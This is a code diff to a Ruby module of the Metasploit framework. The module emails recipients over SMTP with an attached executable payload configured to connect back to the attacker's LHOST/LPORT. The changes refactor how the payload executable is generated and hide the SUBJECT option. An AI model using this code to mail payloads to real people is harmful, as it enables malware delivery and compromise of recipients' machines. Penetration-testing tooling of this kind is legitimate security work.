@@ -20,6 +20,7 @@ class Metasploit3 < Msf::Auxiliary
 	# This module sends email messages via smtp
 	#
 	include Msf::Exploit::Remote::SMTPDeliver
+	include Msf::Exploit::EXE
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -41,11 +42,13 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					OptString.new('RHOST', [true, "SMTP server address",'127.0.0.1']),
 					OptString.new('RPORT', [true, "SMTP server port",'25']),
-					OptString.new('YAML_CONFIG', [true, "Full path to YAML Configuration file",File.join(Msf::Config.install_root, "data","emailer_config.yaml")]),
+					OptString.new('YAML_CONFIG', [true, "Full path to YAML Configuration file",
+						File.join(Msf::Config.install_root, "data","emailer_config.yaml")]),
 				], self.class)
 
 		# Hide this option from the user
 		deregister_options('MAILTO')
+		deregister_options('SUBJECT')
 	end
 
 	def run
@@ -107,7 +110,11 @@ class Metasploit3 < Msf::Auxiliary
 					'Format'  => 'raw',
 					'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
 				)
-			exe = Msf::Util::EXE.to_executable(framework, mod.arch, mod.platform, buf)
+			exe = generate_payload_exe({
+					:code => buf,
+					:arch => mod.arch,
+					:platform => mod.platform
+				})
 
 			print_status("Writing payload to #{attachment_file}")
 			# XXX If Rex::Zip will let us zip a buffer instead of a file,
